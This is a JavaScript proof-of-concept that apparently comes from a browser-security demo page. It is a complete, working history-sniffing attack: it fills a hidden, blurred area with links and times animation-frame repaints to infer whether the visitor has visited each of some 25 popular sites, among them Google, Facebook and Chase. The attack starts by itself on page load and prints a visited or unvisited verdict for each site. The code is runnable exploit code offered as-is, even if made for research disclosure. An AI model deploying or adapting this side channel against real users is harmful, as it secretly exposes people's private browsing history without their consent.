"use strict";

var attackRunning = false;
var launchTest = document.getElementById("launch-test");


const NEVER_VISITED =
		"http://laddress-you-must-have-never-visited-before100000.com";
const NEVER_VISITED2 =
	"http://laddress-you-must-have-never-visited-before200000.com";
const LINKS = [
	location.href,
	"https://www.google.com",
	"https://www.facebook.com",
	"https://twitter.com",
	"https://twitter.com/upsuperx",
	"https://bugzilla.mozilla.org",
	"https://www.google.co.uk",
	"http://www.youtube.com", 
	"https://www.linkedin.com",
	"http://www.craigslist.org", 
	"http://stackoverflow.com", 
	"http://www.bing.com",
	"http://www.bbc.co.uk",
	"http://www.microsoft.com",
	"http://www.amazon.com",
	"http://www.reddit.com", 
	"http://news.ycombinator.com",
	"http://www.wordpress.com",
	"http://pinterest.com",
	"http://www.apple.com",
	"http://arstechnica.com",
	"https://www.quora.com",
	"https://www.yahoo.com",
	"https://www.instagram.com",
	"https://www.chase.com"
];

const test_area = document.getElementById('test-area');
const test_links = test_area.children;


function initTestArea(num) {
	var count = num / Math.pow(window.devicePixelRatio, 2);
	// We create count links
	for (var i = 0; i < count; i++) {
		var a = document.createElement('a');
		a.appendChild(document.createTextNode('### ### ###'));
		test_area.appendChild(a);
	}
}

function setTestAreaLink(link) {
	for (var i = 0; i < test_links.length; i++) {
		test_links[i].href = link;
		// test_links[i].style.color = "";
		// test_links[i].style.color = "red";
	}
}

function requestAnimationFrames(callbacks) {
	if (callbacks.length > 0) {
		requestAnimationFrame(function(t){
			callbacks.shift()(t);
			requestAnimationFrames(callbacks);
		});
	}
}

function EMPTY_LOOP(){}
function checkOnePass(link) {
	return new Promise(function(resolve, reject){
		var timestamps = [];
		function getCallback(link, log_time) {
			return function(t){
				if (log_time){
					timestamps.push(t);
				}
				setTestAreaLink(link);
			};
		}
		var callbacks;
		callbacks = [
		getCallback(NEVER_VISITED, false),
		getCallback(NEVER_VISITED, false),
		getCallback(link, true), EMPTY_LOOP,
		getCallback(NEVER_VISITED, true), EMPTY_LOOP,
		function(t){
				timestamps.push(t);
				resolve({
					test: [timestamps[1] - timestamps[0],
								timestamps[2] - timestamps[1]],
				});
			}
		];
		requestAnimationFrames(callbacks);
	});
}
function computeMedian(series) {
	var sorted = series.slice(0);
	sorted.sort();
	var median_index = Math.floor(sorted.length / 2);
	if (median_index * 2 != sorted.length) {
		return sorted[median_index];
	} else {
		return (sorted[median_index - 1] + sorted[median_index]) / 2;
	}
}
function examineTimeSeries(test_series, base_series) {
	var test_median = computeMedian(test_series);
	var base_median = computeMedian(base_series);
	return test_median > base_median * 1.10;
}

function checkIsLinkVisited(link, nbIter, base_series) {
	return new Promise(function(resolve, reject){
		var test_series = [];
		var promise = Promise.resolve();
		for (var i = 0; i < nbIter; i++) {
			promise = promise
				.then(function(){
					return checkOnePass(link);
				})
				.then(function(times){
					test_series.push(...times.test);
				});
		}
		promise.then(function(){
			var visited = examineTimeSeries(test_series, base_series);
			resolve({ visited, test_series, base_series });
		});
	});
}

function runNonVisited(nbIter){
		return new Promise(function(resolve, reject){
			var base_series = [];
			var promise = Promise.resolve();
			for (var i = 0; i < nbIter; i++) {
				promise = promise
					.then(function(){
							return new Promise(function(resolve, reject){
									var timestamps = [];
									function getCallback(link, log_time) {
											return function(t){
												if (log_time){
													timestamps.push(t);
													}
													setTestAreaLink(link);
											};
									}
									var callbacks;
									callbacks = [
											// getCallback(NEVER_VISITED, false),
											getCallback(NEVER_VISITED, false),
											getCallback(NEVER_VISITED, true), EMPTY_LOOP, 
											getCallback(NEVER_VISITED2, true), EMPTY_LOOP,
											getCallback(NEVER_VISITED, true), EMPTY_LOOP,
											function(t){
												timestamps.push(t);
												resolve({
														base: [timestamps[1] - timestamps[0],
																timestamps[2] - timestamps[1]]
												});
											}
									];
									requestAnimationFrames(callbacks);
							});
					}).then(function(times){
							base_series.push(...times.base);
					});
			}
			promise.then(function(){
				resolve(base_series);
			});
		});
}

function runVisited(nbIter){
		return new Promise(function(resolve, reject){
			var base_series = [];
			var promise = Promise.resolve();
			for (var i = 0; i < nbIter; i++) {
				promise = promise
					.then(function(){
							return new Promise(function(resolve, reject){
									var timestamps = [];
									function getCallback(link, log_time) {
											return function(t){
													if (log_time){
													timestamps.push(t);
													}
													setTestAreaLink(link);
											};
									}
									var callbacks;
									callbacks = [
										getCallback(NEVER_VISITED, false),
										getCallback(LINKS[0], true), EMPTY_LOOP,
										getCallback(NEVER_VISITED, true), EMPTY_LOOP,
										function(t){
												timestamps.push(t);
												resolve({
													test: [timestamps[1] - timestamps[0],
																timestamps[2] - timestamps[1]],
												});
											}
										];
									requestAnimationFrames(callbacks);
							});
					}).then(function(times){
							base_series.push(...times.test);
					});
			}
			promise.then(function(){
				resolve(base_series);
			});
		});
}

function listTimes(time_series) {
	return time_series.map(t => Math.round(t)).join(', ');
}
function generateDetails(result) {
	var ul = document.createElement('ul');
	ul.className = 'details';
	var test = document.createElement('li');
	test.appendChild(document.createTextNode(`test: ${listTimes(result.test_series)}`));
	ul.appendChild(test);
	return ul;
}


function runAttack(){
	var nbFailures = 0;
	attackRunning = true;
	launchTest.innerHTML = "Attack running ...";	
	test_area.style.position = "fixed";
	test_area.style.display = "block";

	const links = document.getElementById('links');
	links.innerHTML = "";
	initTestArea(500);
	var promise = Promise.resolve();
	var calibrate = true;
	var base_series = [];
	var iter_to_base_series = {};
	var non_visited_series = [];
	var visited_series = [];
	var timeRequired = [];
	var testAreaElt = document.getElementById("test-area");
	// position:fixed;
	// top: 0; left: 0;
	// right: 0; bottom: 0;
		
	function optimizeParameters(promiseCondition, nbIter, blurPx){
		return new Promise(function(resolve, reject){
			var start;
			if(nbIter == 1){
				return reject("0iter");
			}

			testAreaElt.style.filter = "blur("+blurPx+"px) blur("+blurPx+"px) opacity(0%)";
			testAreaElt.style.webkitFilter = "blur("+blurPx+"px) blur("+blurPx+"px) opacity(0%);";
			promiseCondition.then(function(){
				start = performance.now();
				return runNonVisited(nbIter);
			}).then(function(result){
				non_visited_series = result;
				iter_to_base_series[nbIter] = result;
				return Promise.resolve();
			}).then(function(res){
				return runVisited(nbIter);
			}).then(function(result){
				visited_series = result;
				var validated = examineTimeSeries(visited_series, non_visited_series);
				return Promise.resolve(validated);
			}).then(function(result){
				timeRequired.push(performance.now()-start);
				if(result){
					optimizeParameters(Promise.resolve(), nbIter-1, blurPx-5).then(function(res){
						var resParameters = {
							nbIter: res.nbIter,
							blur: res.blur,
							non_visited_series: res.non_visited_series
						}
						return resolve(resParameters);
					}, function(res){
						var resParameters = {
							nbIter: nbIter,
							blur: blurPx,
							non_visited_series: iter_to_base_series[nbIter]
						}
						return resolve(resParameters);
					});
				} else{
					return reject("Should not be there ?");
				}
			}).catch(function(err){
				return resolve("An exception occured");
			});
		});
	}
		
	function launchOptim(blur){
		return new Promise(function(resolve, reject){
			var p1 = optimizeParameters(Promise.resolve(), 3, blur);
			p1.then(function(optimizedParameters){
				return resolve(optimizedParameters);
			}, function(failure){
				nbFailures++;
				if(nbFailures > 3){
					return reject("failure");
				}
				launchOptim(blur+10).then(function(res){
					return resolve(res);
				}, function(err){
					return reject("failure");
				});
			}).catch(function(err){
				return reject("failure");
			});
		});
	}

	function testLinks(optimizedParameters){
		var blurPx = optimizedParameters.blur;
		//We set the filter with the optimal value
		testAreaElt.style.filter = "blur("+blurPx+"px) blur("+blurPx+"px) opacity(0%)";
		testAreaElt.style.webkitFilter = "blur("+blurPx+"px) blur("+blurPx+"px) opacity(0%)";
		// We shouldn't have to do +1, fix this !
		var nbIter = optimizedParameters.nbIter;
		var linksToResults = {};
		return new Promise(function(resolve, reject){
			LINKS.forEach(function(link){
				promise = promise
					.then(function(){
						return checkIsLinkVisited(link, nbIter, optimizedParameters.non_visited_series);
					})
					.then(function(result){
						linksToResults[link] = result; 
						if(Object.keys(linksToResults).length == LINKS.length){
							resolve(linksToResults);
						}
					});
			});
		});
	}

	launchOptim(45).then(function(optimizedParameters){
		return testLinks(optimizedParameters);
	}).then(function(res){
		testAreaElt.style.position = "relative";
		testAreaElt.style.display = "none";
		for(var link in res){
			var result = res[link];
			var li = document.createElement('li');
			li.className = result.visited ? 'visited' : 'unvisited';
			var a = document.createElement('a');
			a.href = link;
			a.appendChild(document.createTextNode(link));
			li.appendChild(a);
			li.appendChild(generateDetails(result));
			links.appendChild(li);
		}
		launchTest.innerHTML = "Launch attack";
		attackRunning = false;
	}, function(optimizedParameters){
		testAreaElt.style.position = "relative";
		testAreaElt.style.display = "none";
		launchTest.innerHTML = "Attack doesn't work in your browser";
	}).catch(function(err){
		testAreaElt.style.position = "relative";
		testAreaElt.style.display = "none";
		launchTest.innerHTML = "Attack doesn't work in your browser";
	});
}

runAttack();

launchTest.addEventListener("click", function(){
	if(!attackRunning){
		runAttack();
	}
});
